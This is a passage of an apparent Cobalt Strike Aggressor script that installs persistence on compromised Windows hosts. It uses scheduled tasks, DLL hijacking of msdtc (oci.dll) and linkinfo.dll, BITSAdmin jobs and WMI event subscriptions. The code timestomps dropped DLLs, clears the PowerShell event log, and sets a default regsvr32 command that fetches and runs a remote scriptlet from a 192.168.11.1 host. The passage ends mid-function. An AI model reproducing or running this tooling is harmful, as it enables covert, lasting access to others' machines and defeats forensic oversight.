			local('$bid $taskname $taskwhere $taskinfo $taskrun $dotype $ChannelName $EventID $ST $level $runuser $MO');
			$bid = $3['bid'];
			$taskname = $3['taskname'];
			$taskwhere = $3['taskwhere'];
			$taskinfo = $3['taskinfo'];
			$taskrun = $3['taskrun'];
			$dotype = $3['dotype'];
			$ChannelName = $3['ChannelName'];
			$EventID = $3['EventID'];
			$ST = $3['ST'];
			$level = $3['level'];
			$runuser = $3['runuser'];
			$MO = $3['MO'];
			#If it is an event Trigger 
			if($dotype eq "ONEVENT"){
				#Settings Event Types and Events ID
				if($ChannelName eq "" ){
					$Dialog = dialog("Settings Events",%(taskname => $taskname ,taskwhere =>  $taskwhere ,taskinfo => $taskinfo ,taskrun => $taskrun ,dotype => $dotype ,ChannelName => "Security" ,EventID => "4624" ,type => "schtasks",level => $level,runuser => $runuser,bid => $bid),&AddSchtasks);
					dialog_description($Dialog, "Commonly used Events：Security-4624:AccountLogged in successfully;Security-4634:Account Logged out;System-7001:User login notification for Customer Experience Improvement Program;Application-9027:Desktop Window Manager has registered session port;");
					drow_combobox($Dialog, "ChannelName", "Events Passage(/EC): ", @("Security","System","Application","Setup"));    
					drow_text($Dialog, "EventID", "EventsID: ");
					dbutton_action($Dialog, "AddSchtasks");
					dialog_show($Dialog);
				}else{
					btask($bid, "Add Schtasks Use $dotype");
					if($runuser eq "SYSTEM"){
						blog($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /RU $runuser /SC $dotype /RL $level /EC $ChannelName /MO *[$ChannelName\/EventID=$EventID\]");
						bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /RU $runuser /SC $dotype /RL $level /EC $ChannelName /MO *[$ChannelName\/EventID=$EventID\]"); 
					}else
					{
						blog($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /RL $level /EC $ChannelName /MO *[$ChannelName\/EventID=$EventID\]");
						bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /RL $level /EC $ChannelName /MO *[$ChannelName\/EventID=$EventID\]"); 
					}
					
				}
			}else if($dotype eq "ONSTART"){  #Start Execution, you can't start it with SYSTEMAdd, the task can be created, but it can't be started, you need to specify /RU for SYSTEM
				if (!-isadmin $bid){
					berror($bid,"Persistence Requires Admin Level Privileges");
				}else{
					if($runuser eq "SYSTEM"){
						blog($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /RU $runuser /SC $dotype /RL $level /NP /F /DELAY 0000:05");
						bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /RU $runuser /SC $dotype /RL $level /NP /F /DELAY 0000:05");
					}else{
						blog($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /F /DELAY 0000:05");
						bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /F /DELAY 0000:05");
					}
				}
			}else if($dotype eq "ONLOGON"){  	#When logging in Execution
				if (!-isadmin $bid){
					berror($bid,"Persistence Requires Admin Level Privileges");
				}else{
					if($runuser eq "SYSTEM"){
						blog($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /RU $runuser /SC $dotype /RL $level /F /DELAY 0000:05");
						bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /RU $runuser /SC $dotype /RL $level /F /DELAY 0000:05");
					}else{
						blog($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /RL $level /F /DELAY 0000:05");
						bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /RL $level /F /DELAY 0000:05");
					}
				}
			}
			#Idle Execution, a period of time without mouse and keyboard input after a minute Execution task, you need to add a mutex lock to the horse, after Execution is easy to be kill..
			else if($dotype eq "ONIDLE"){
				if($runuser eq "SYSTEM"){blog($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /RU $runuser /SC $dotype /I 1");
				bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /RU $runuser /SC $dotype /I 1");}else{blog($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /I 1");
				bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /I 1");}
			}
			#Executed once
			else if($dotype eq "ONCE"){
				if($ST eq ""){
					$Dialog = dialog("OnceSettings Start time",%(taskname => $taskname,taskwhere =>  $taskwhere ,taskinfo => $taskinfo ,runuser => $runuser,taskrun => $taskrun ,dotype => $dotype ,ST => formatDate(ticks() + (1000 * 30), "HH:mm") ,type => "schtasks",level => $level,bid => $bid),&AddSchtasks);
					dialog_description($Dialog, "For one-time Program tasks, please Settings Start time,The time format is HH:mm (24 hour time), default 30 seconds after start."); 
					drow_text($Dialog, "taskname", "Task name(/TN): ");
					drow_text($Dialog, "ST", "Start time: ");
					dbutton_action($Dialog, "AddSchtasks");
					dialog_show($Dialog);
				}else{
					if($runuser eq "SYSTEM"){
						if($level eq "HIGHEST"){
							blog($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /RU $runuser /SC $dotype /ST $ST /RL $level /NP /F");
							bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /RU $runuser /SC $dotype /ST $ST /RL $level /NP /F");
						}else{
							blog($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /ST $ST /F"); 
							bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /ST $ST /F");  
						}
					}else{
						if($level eq "HIGHEST"){
							blog($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /RU $runuser /SC $dotype /ST $ST /RL $level /F");
							bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /RU $runuser /SC $dotype /ST $ST /RL $level /F");
						}else{
							blog($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /ST $ST /F"); 
							bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /ST $ST /F");  
						}
					}
				}
			}else if($dotype eq "MINUTE"){
				if($MO eq ""){
					$Dialog = dialog("Minute Rate Execution",%(taskname => $taskname,taskwhere =>  $taskwhere ,taskinfo => $taskinfo,runuser => $runuser ,taskrun => $taskrun ,dotype => $dotype ,MO => "10" ,type => "schtasks",level => $level,bid => $bid),&AddSchtasks);
					dialog_description($Dialog, "For how many minutes to Execution tasks, please Settings Interval, /MO: 1 to 1439 minutes"); 
					drow_text($Dialog, "taskname", "Task name(/TN): ");
					drow_text($Dialog, "MO", "Interval time: ");
					dbutton_action($Dialog, "AddSchtasks");
					dialog_show($Dialog);
				}else{
					if($runuser eq "SYSTEM"){
						blog($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /RU $runuser /SC $dotype /MO $MO /RL $level /NP /F");
						bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /RU $runuser /SC $dotype /MO $MO /RL $level /NP /F");
					}else{
						blog($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /MO $MO /F"); 
						bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /MO $MO /F");
					}
				}		
			}
			else if($dotype eq "HOURLY")
			{
				if($MO eq ""){
					$Dialog = dialog("Hourly frequency Execution",%(taskname => $taskname ,taskwhere =>  $taskwhere ,taskinfo => $taskinfo,runuser => $runuser ,taskrun => $taskrun ,dotype => $dotype ,MO => "1" ,type => "schtasks",level => $level,bid => $bid),&AddSchtasks);
					dialog_description($Dialog, "For how many hours to Execution tasks, please Settings Interval time,/MO：1 - 23 Hours"); 
					drow_text($Dialog, "taskname", "Task name(/TN): ");
					drow_text($Dialog, "MO", "Interval time: ");
					dbutton_action($Dialog, "AddSchtasks");
					dialog_show($Dialog);
				}else{
					if($runuser eq "SYSTEM"){
						blog($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /RU $runuser /SC $dotype /MO $MO /RL $level /NP /F");
						bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /RU $runuser /SC $dotype /MO $MO /RL $level /NP /F");
					}else{
						blog($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /MO $MO /F");
						bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /MO $MO /F");
					}
				}		
			}
			else if($dotype eq "DAILY"){
				if($MO eq ""){
					$Dialog = dialog("Frequency by day Execution",%(taskname => $taskname,taskwhere =>  $taskwhere ,taskinfo => $taskinfo,runuser => $runuser ,taskrun => $taskrun ,dotype => $dotype ,MO => "1" ,type => "schtasks",level => $level,bid => $bid),&AddSchtasks);
					dialog_description($Dialog, "For how many days to Execution tasks, please Settings Interval time,/MO: 1 to 365 days"); 
					drow_text($Dialog, "taskname", "Task name(/TN): ");
					drow_text($Dialog, "MO", "Interval time: ");
					dbutton_action($Dialog, "AddSchtasks");
					dialog_show($Dialog);
				}else{
					if($runuser eq "SYSTEM"){
						blog($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /RU $runuser /SC $dotype /MO $MO /RL $level /NP /F");
						bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /RU $runuser /SC $dotype /MO $MO /RL $level /NP /F");
					}else{
						blog($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /MO $MO /F");
						bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /MO $MO /F");
					}
				}		
			}else if($dotype eq "WEEKLY"){
				if($MO eq ""){
					$Dialog = dialog("Weekly Execution",%(taskname => $taskname,taskwhere =>  $taskwhere ,taskinfo => $taskinfo,runuser => $runuser ,taskrun => $taskrun ,dotype => $dotype ,MO => "1" ,type => "schtasks",level => $level,bid => $bid),&AddSchtasks);
					dialog_description($Dialog, "For how many weeks to Execution tasks, please Settings Interval time,/MO: 1 to 52 weeks"); 
					drow_text($Dialog, "taskname", "Task name(/TN): ");
					drow_text($Dialog, "MO", "Interval time: ");
					dbutton_action($Dialog, "AddSchtasks");
					dialog_show($Dialog);
				}else{
					if($runuser eq "SYSTEM"){
						blog($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /RU $runuser /SC $dotype /MO $MO /RL $level /NP /F");
						bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /RU $runuser /SC $dotype /MO $MO /RL $level /NP /F");
					}else{
						blog($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /MO $MO /F");
						bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /MO $MO /F");
					}
				}		
			}
			else if($dotype eq "MONTHLY")
			{
				if($MO eq ""){
					$Dialog = dialog("Monthly Execution",%(taskname => $taskname,taskwhere =>  $taskwhere ,taskinfo => $taskinfo,runuser => $runuser ,taskrun => $taskrun ,dotype => $dotype ,MO => "1" ,type => "schtasks",level => $level,bid => $bid),&AddSchtasks);
					dialog_description($Dialog, "For how many months to Execution tasks, please Settings Interval time,/MO: 1 to 12, or FIRST, SECOND, THIRD, FOURTH, LAST, LASTDAY"); 
					drow_text($Dialog, "taskname", "Task name(/TN): ");
					drow_text($Dialog, "MO", "Interval time: ");
					dbutton_action($Dialog, "AddSchtasks");
					dialog_show($Dialog);
				}else{
					if($runuser eq "SYSTEM"){
						blog($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /RU $runuser /SC $dotype /MO $MO /RL $level /NP /F");
						bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /RU $runuser /SC $dotype /MO $MO /RL $level /NP /F");
					}else{
						blog($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /MO $MO /F");
						bshell($bid , "SCHTASKS /Create /TN $taskname /TR \"$taskrun\" /SC $dotype /MO $MO /F");
					}
				}		
			}else{
				show_error("0");
			}

		}

		sub AddSchtasks_API{
			local('$bid $taskname $taskinfo $taskrun $runuser $dotype $CreateIs $Runtime');
			$bid = $3['bid'];
			$taskname = $3['taskname'];
			$taskinfo = $3['taskinfo'];  # ?1
			$taskrun = $3['taskrun'];
			$runuser = $3['runuser'];
			$dotype = $3['dotype'];
			$CreateIs = $3['CreateIs'];
			$Runtime = $3['Runtime'];
			#The following Mode does not use Settings time, ONIDLE default idle 5 minutes, SESSION_STATE_CHANGE default administrator disconnect remote link enabled (server)
			if($dotype in @("ONBOOT","ONLOGON","ONIDLE","SESSION_STATE_CHANGE")){
				blog($bid , "Add $dotype Schtasks,Taskname is:$taskname");
				$Runtime = "2020-05-20T05:20:00";
				$Parameter = $taskname . "|" . URLencode(replace($taskinfo,' ',''))  . "|" .$taskrun. "|" .$runuser. "|" .$CreateIs."|".$Runtime."|".$dotype;	
				$Data = pack("I-", 2) .$Parameter;
				bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Task_Scheduler/reflective_dll.dll"),$Data, "AddSchtasks_API ", 5000);
			}else{   #Execution daily at the time of Settings, 5 Execution per week, 13 Execution per month
				if($Runtime eq ""){
					$Dialog = dialog("Settings Program tasksStart time",%(taskname => $taskname,taskinfo => $taskinfo,taskrun => $taskrun,runuser => $runuser,dotype => $dotype,CreateIs => $CreateIs,Runtime => (formatDate((ticks()+(1000 * 30)),"yyyy-MM-dd'T'HH:mm:ss")),bid => $bid),&AddSchtasks_API);
					dialog_description($Dialog, "Using API Add Program tasks in the reflection DLL");
					drow_text($Dialog, "taskname", "Task name: ");
					drow_text($Dialog, "Runtime", "ExecutionTime: ");
					dbutton_action($Dialog, "AddSchtasks");
					dialog_show($Dialog);
				}
				else{
					blog($bid , "Add $dotype Schtasks,Taskname is:$taskname");
					$Parameter = $taskname . "|" . URLencode(replace($taskinfo,' ','')) . "|" .$taskrun. "|" .$runuser. "|" .$CreateIs."|".$Runtime."|".$dotype;	
					$Data = pack("I-", 2) .$Parameter;
					bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Task_Scheduler/reflective_dll.dll"),$Data, "AddSchtasks_API ", 5000);
				}
			}
		}

		sub DelSchtasks {
			local('$bid $taskname $type');
			$bid = $3['bid'];
			$taskname = $3['taskname'];
			$type = $3['type'];
			if($type eq "schtasks"){
				blog($bid , "SCHTASKS /delete /TN $taskname /F");
				bshell($bid , "SCHTASKS /delete /TN $taskname /F");
			}
		}

		menu "DLL Loading"{
			menu "Msdtc" {
				item "Upload oci.dll" {
					local('$bid');
					foreach $bid ($1){
					#Select the cs auto-generated, select the locally existing
						$Dialog = dialog("Upload oci.dll", %(ociFile => "" , bid => $bid), lambda({
							local('$bid $ociFile $Arch $Parameter $Data $TempFile $NewFile');
							$ociFile = $3['ociFile'];
							$Arch = $3['Arch'];
							$bid = $3['bid'];
							
							blog($bid,"sc stop msdtc");
							brun($bid,"sc stop msdtc");
							sleep(3000);
							
							$NewFile = "C:\\windows\\system32\\oci.dll";
							$TempFile = "C:\\Windows\\Temp\\".randomFileName(6);
							blog($bid,"Upload ".$ociFile." to $TempFile ");	
							$handle = openf($ociFile);
							$bdata   = readb($handle, -1);
							closef($handle);
							bupload_raw($bid,$TempFile,$bdata);
							btimestomp($bid, $TempFile, "C:\\windows\\regedit.exe");
							$Data = "1 $TempFile $NewFile";
							bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Msdtc32/reflective_dll.dll"),$Data, "Move File", 6000);
							
							blog($bid,"sc config msdtc start= auto obj= LocalSystem");
							brun($bid,"sc config msdtc start= auto obj= LocalSystem");
							blog($bid,"sc start msdtc");	
							brun($bid,"sc start msdtc");	
							}));
						dialog_description($Dialog, "Upload oci.dll到C:\\Windows\\System32\\");
						drow_file($Dialog, "ociFile", "File: ");
						dbutton_action($Dialog, "Execution");
						dialog_show($Dialog);
					}
				}

				# MoveFileEx.dll  D:\xxx\CobaltStrike_script\Persistence\MSDTC
				item "Remove oci.dll"{
					local('$bid $ociFile $Data');
					$ociFile = "C:\\windows\\system32\\oci.dll";
					foreach $bid ($1){
						if( binfo($bid, "process") eq "msdtc.exe"){
							blog($bid , "File will be deleted after restart.");
							$Data = "2 $ociFile $ociFile";
							bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Msdtc32/reflective_dll.dll"),$Data, "Move File", 6000);
						}else{
							blog($bid , "Will Stop msdtc Service.");
							blog($bid , "sc stop msdtc");
							brun($bid , "sc stop msdtc");
							$Data = "0 $ociFile $ociFile";
							bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Msdtc32/reflective_dll.dll"),$Data, "Move File", 6000);
							blog($bid , "sc start msdtc");
							brun($bid , "sc start msdtc");
						}
					}
				}
			}
			
			# https://www.cnblogs.com/websecyw/p/12561630.html
			menu "Linkinfo" {
				item "Upload linkinfo.dll"{
					local('$bid');
					foreach $bid ($1){
						#binput($bid, "blockdlls start"); 
						#bblockdlls($bid, true); 
						$Dialog = dialog("Upload linkinfo.dll", %(linkinfoFile => "", bid => $bid), 
							lambda({
								local('$bid $linkinfoFile $TempFile');
								$TempFile = "C:\\windows\\linkinfo.dll";
								$linkinfoFile = $3['linkinfoFile'];
								$bid = $3['bid'];
								blog($bid,"Upload ".$linkinfoFile." to $TempFile ");	
								$handle = openf($linkinfoFile);
								$bdata   = readb($handle, -1);
								closef($handle);
								bupload_raw($bid,$TempFile,$bdata);
								btimestomp($bid,$TempFile,"C:\\windows\\regedit.exe");
							})
						);
						dialog_description($Dialog, "Upload linkinfo.dll to C:\\Windows\\");
						drow_file($Dialog, "linkinfoFile", "File: ");
						dbutton_action($Dialog, "Execution");
						dialog_show($Dialog);
					}
				}
				
				item "Remove linkinfo.dll"{
					local('$bid $TempFile');
					$TempFile = "C:\\windows\\linkinfo.dll";
					foreach $bid ($1){
						if( lc(binfo($bid, "process")) eq "explorer.exe"){
							
						}
						blog($bid, "-------".getnow()."-------");
						blog($bid , "The file will be delete after restart.");
						$Data = "2 C:\\windows\\linkinfo.dll 1";
						bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Linkinfo/reflective_dll.dll"),$Data, "Del linkinfo.dll after reboot.", 5000);
					}
				}
			}
			
		sub linkinfoUpoad {
			local('$bid $UploadPath $Arch $Type $linkinfofile');
			$bid = $3['bid'];
			$UploadPath = $3['UploadPath'];
			$Arch = $3['Arch'];
			$Type = $3['Type'];
			$linkinfofile = $3['linkinfofile'];
			if($Type eq "Upload local file"){
				if($linkinfofile eq ""){
					$Dialog = dialog("Upload linkinfo.dll", %(UploadPath => $UploadPath , bid => $bid, Arch => $Arch ,Type => "Upload local file",linkinfofile => $linkinfofile), &linkinfoUpoad);
					dialog_description($Dialog, "Please select linkinfo.dllUpload ");
					drow_file($Dialog, "linkinfofile", "File: ");
					dbutton_action($Dialog, "Upload ");
					dialog_show($Dialog);
				}else{
					blog($bid, "-------".getnow()."-------");
					bupload_raw($bid, $UploadPath."linkinfo.dll", readb(openf($linkinfofile), -1));
					btimestomp($bid, "linkinfo.dll", "C:\\windows\\regedit.exe");
					sleep(5000);
					blog($bid, "Done.");
				}
			}else{
				blog($bid,"Generate dll file");
				
			}
		}
		}

		menu "BITSadmin Task"{
			item "Add Task"{
				local('$bid');
				foreach $bid ($1){
					$dialog = dialog("Bitsadmin Persistence", %(JobName => "WindowsUpdate", CmdLine => "regsvr32.exe /u /s /i:http://192.168.11.1:80/download/calc.sct scrobj.dll" ,bid => $bid), &bitsadmin);
					dialog_description($dialog, "Create a bitsadmin Task to be executed as the current User context. this Task will be executed every time the User logs in. currently only available for Windows 7, 8, Server 2008 and Server 2012.");
					drow_text($dialog, "JobName",  "Task name：");
					drow_text($dialog, "CmdLine", "ExecutionCommand:");
					dbutton_action($dialog, "Create");
					dialog_show($dialog);
				}
			}
			
			item "Query Task"{
				#Get Task creation time bitsadmin /GetCreationTime <Job>
				local('$bid');
				foreach $bid ($1){
					$Dialog = dialog("Query Task", %(JobName => "WindowsUpdate", bid => $bid), lambda({
						local('$bid $JobName');
						$bid = $3['bid'];
						$JobName = $3['JobName'];
						if($JobName eq ""){
							if (!-isadmin $bid){
								blog($bid,"bitsadmin /list /verbose");
								brun($bid,"bitsadmin /list /verbose");
							}else{
								blog($bid,"bitsadmin /list /allusers /verbose")
								brun($bid,"bitsadmin /list /allusers /verbose")
							}
						}else{
							blog($bid,"bitsadmin /rawreturn /info $JobName");
							brun($bid,"bitsadmin /rawreturn /info $JobName");
						}})
					);
					
					dialog_description($Dialog, "Query the creation time according to Task name, and list all Task if left blank.");
					drow_text($Dialog, "JobName",  "Task name:");
					dbutton_action($Dialog, "Query");
					dialog_show($Dialog);
				}
			}
			
			item "Delete Task"{
				local('$bid');
				foreach $bid ($1){
					$Dialog = dialog("Delete Task", %(JobName => "WindowsUpdate", bid => $bid), lambda({
						local('$bid $JobName');
						$bid = $3['bid'];
						$JobName = $3['JobName'];
						if($JobName eq ""){
							if (!-isadmin $bid){
								blog($bid,"bitsadmin /reset");
								brun($bid,"bitsadmin /reset");
							}else{
								blog($bid,"bitsadmin /reset /allusers");
								brun($bid,"bitsadmin /reset /allusers");
							}
						}else{
							blog($bid,"bitsadmin /cancel $JobName");
							brun($bid,"bitsadmin /cancel $JobName");
						}
					}));
						
					dialog_description($Dialog, "According to Task nameDelete BitJob, leave empty then Delete all.");
					drow_text($Dialog, "JobName",  "Task name:");
					dbutton_action($Dialog, "Cancel");
					dialog_show($Dialog);
				}
			}
		}

		#WMI Event Subscription
		menu "WMIEvents" {
			item "Register Events Subscribe" {
				local('$bid');
				foreach $bid ($1){	
					$Dialog = dialog("WMI Registration", %(EventFilterName => "WindowsUpdate_".ticks(), EventConsumerName => "DownLoader_" .ticks(), RunType => "CommandLine" , Trigger => "Timed", bid => $bid) ,  &RegWMI );
					dialog_description($Dialog, "Register WMI permanent Events subscription for permission maintenance.");
					drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
					drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
					drow_combobox($Dialog, "Trigger", "EventsTrigger Instrument Type: ", @("InsertUSB","UserLogon","ProcessStart","Interval","Timed","Reboot"));
					drow_combobox($Dialog, "RunType", "EventsConsumer Category Name: ", @("CommandLine","ActiveScript")); #,"LocalScriptBlock"
					dbutton_action($Dialog, "Registration");
					dialog_show($Dialog);
				}
			}
			
			item "Check Events subscriptions" {
				local('$bid');
				foreach $bid ($1){
					$Dialog = dialog("View WMIEvents Subscriptions", %(NamespaceName => "root/subscription" , EventFilterName => "", EventConsumerName => "", bid => $bid , BindingTo => 'Like', RunType => "CommandLine"), lambda({
						local('$bid $EventFilterName $EventConsumerName');
						$bid = $3['bid'];
						$EventFilterName = $3['EventFilterName'];
						$EventConsumerName = $3['EventConsumerName'];
						$NamespaceName = $3['NamespaceName'];
						$RunType = $3['RunType'];
						$BindingTo = $3['BindingTo'];
						if (-isadmin $bid){
							if($EventFilterName eq "" ){
								if($EventConsumerName eq ""){
									blog($bid, "Show All $RunType"."EventConsumer"." WMI Event Subscriptions.");
									bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
									bpowerpick($bid,"ShowEventSubscription -NamespaceName $NamespaceName -RunType $RunType -BindingTo $BindingTo");
									bshell($bid,"wevtutil cl \"Windows PowerShell\"");
								}else{
									blog($bid, "Show $RunType"."EventConsumer"." WMI Event Subscriptions. Consumer: $EventConsumerName");
									bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
									bpowerpick($bid,"ShowEventSubscription -NamespaceName $NamespaceName -RunType $RunType -BindingTo $BindingTo -EventConsumerName $EventConsumerName");
									bshell($bid,"wevtutil cl \"Windows PowerShell\"");
								}
							}else if($EventConsumerName eq ""){
								if($EventFilterName eq ""){
									blog($bid, "Show All $RunType"."EventConsumer"." WMI Event Subscriptions.");
									bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
									bpowerpick($bid,"ShowEventSubscription -NamespaceName $NamespaceName -RunType $RunType -BindingTo $BindingTo");
									bshell($bid,"wevtutil cl \"Windows PowerShell\"");
								}else{
									blog($bid, "Show $RunType"."EventConsumer"." WMI Event Subscriptions. Filter: $EventFilterName");
									bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
									bpowerpick($bid,"ShowEventSubscription -NamespaceName $NamespaceName -RunType $RunType -BindingTo $BindingTo -EventFilterName $EventFilterName");
									bshell($bid,"wevtutil cl \"Windows PowerShell\"");
								}
							}else{
								blog($bid, "Show WMI Event Subscription");
								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
								bpowerpick($bid,"ShowEventSubscription -RunType $RunType -NamespaceName $NamespaceName -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -BindingTo $BindingTo");
								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
							}	
						}else{
							blog($bid,"It't need Admin privilege.");
						}
					}));
				
					dialog_description($Dialog, "Check Events subscription status, leave blank to see all.");
					drow_text($Dialog, "NamespaceName",  "Namespace:");
					drow_combobox($Dialog, "BindingTo", "Events Binder Query: ", @("Like","Any"));
					drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
					drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
					drow_combobox($Dialog, "RunType", "Events Consumer Name: ", @("CommandLine","ActiveScript"));
					dbutton_action($Dialog, "Check");
					dialog_show($Dialog);
				}
			}
			
			item "Delete Events Subscribed" {
				local('$bid');
				foreach $bid ($1){	
					$Dialog = dialog("Delete WMIEvents Subscribed", %(NamespaceName => "root/subscription" , EventFilterName => "WindowsUpdate", EventConsumerName => "DownLoader", bid => $bid , BindingTo => 'Like', RunType => "CommandLine"), lambda({
					local('$bid $EventFilterName $EventConsumerName');
					$bid = $3['bid'];
					$EventFilterName = $3['EventFilterName'];
					$EventConsumerName = $3['EventConsumerName'];
					$NamespaceName = $3['NamespaceName'];
					$RunType = $3['RunType'];
					$BindingTo = $3['BindingTo'];
					if (-isadmin $bid){
						if($EventFilterName eq "" || $EventConsumerName eq ""  ){
							blog($bid, "Remove All $RunType"."EventConsumer"." WMI Event Subscriptions.");
							bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
							bpowerpick($bid,"CleanEventSubscription -NamespaceName $NamespaceName -RunType $RunType -BindingTo $BindingTo");
							bshell($bid,"wevtutil cl \"Windows PowerShell\"");
						}
						else
						{
							blog($bid, "WMI_Remove_Persistence");
							bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
							bpowerpick($bid,"CleanEventSubscription -RunType $RunType -NamespaceName $NamespaceName -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -BindingTo $BindingTo");
							bshell($bid,"wevtutil cl \"Windows PowerShell\"");
						}	
					}else{
						blog($bid,"It't need Admin privilege.");
					}
				}));
				
					dialog_description($Dialog, "Delete Events subscriptions based on filter name and consumer name, leave blank for Delete All.");
					drow_text($Dialog, "NamespaceName",  "Namespace:");
					drow_combobox($Dialog, "BindingTo", "Events Binder Delete : ", @("Like","Any"));
					drow_text($Dialog, "EventFilterName",  "Event Filter Name:");
					drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
					drow_combobox($Dialog, "RunType", "Events Consumer Category Name: ", @("CommandLine","ActiveScript"));
					dbutton_action($Dialog, "Delete ");
					dialog_show($Dialog);
				}
			}
		}		


		sub RegWMI{
			local('$bid $EventFilterName $EventConsumerName $RunType $Trigger $ProcessName $UserName $Domain $IntervalPeriod $TimerId $ExecutionTime $CommandLineTemplate $ScriptingEngine $Tmp');
			$bid = $3['bid'];
			$EventFilterName = $3['EventFilterName'];
			$EventConsumerName = $3['EventConsumerName'];
			$RunType = $3['RunType'];
			$Trigger = $3['Trigger'];
			$ProcessName = $3['ProcessName'];
			$UserName = $3['UserName'];
			$Domain = $3['Domain'];
			$IntervalPeriod = $3['IntervalPeriod'];
			$TimerId = $3['TimerId'];
			$ExecutionTime = $3['ExecutionTime'];
			$CommandLineTemplate = $3['CommandLineTemplate'];
			$ScriptingEngine = $3['ScriptingEngine'];

			$Tmp = 'Set obj = createobject("wscript.shell"):obj.run "cmd /c C:\\beacon.exe":';
			
			#Check Permissions
			if (-isadmin $bid){
				#Check Input
				if($EventFilterName eq "" || $EventConsumerName eq ""){
					blog($bid,"Confirm Your input.");
				}
				else
				{
					if($RunType  eq "CommandLine"){
						
						#Check Events type
						if($Trigger eq "ProcessStart"){
							if($ProcessName eq ""){
								$Dialog = dialog("Process name Settings ",%(EventFilterName => $EventFilterName,EventConsumerName => $EventConsumerName,CommandLineTemplate => "C:\\beacon.exe",Trigger => $Trigger, ProcessName => "LogonUI.exe" , RunType => $RunType , bid => $bid),&RegWMI);
								dialog_description($Dialog, "Settings Events The process to be matched, when the process starts willTrigger Events Consumers Command line Execution。");
								drow_text($Dialog, "EventFilterName",  "Events Filter Name:");
								drow_text($Dialog, "EventConsumerName",  "Events Consumer Name:");
								drow_text($Dialog, "CommandLineTemplate",  "CommandLine:");
								drow_text($Dialog, "ProcessName",  "Process name:");
								dbutton_action($Dialog, "RegWMI");
								dialog_show($Dialog);
							}else{
								blog($bid, "WMI ProcessStart Event Install");
								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate -ProcessName $ProcessName");
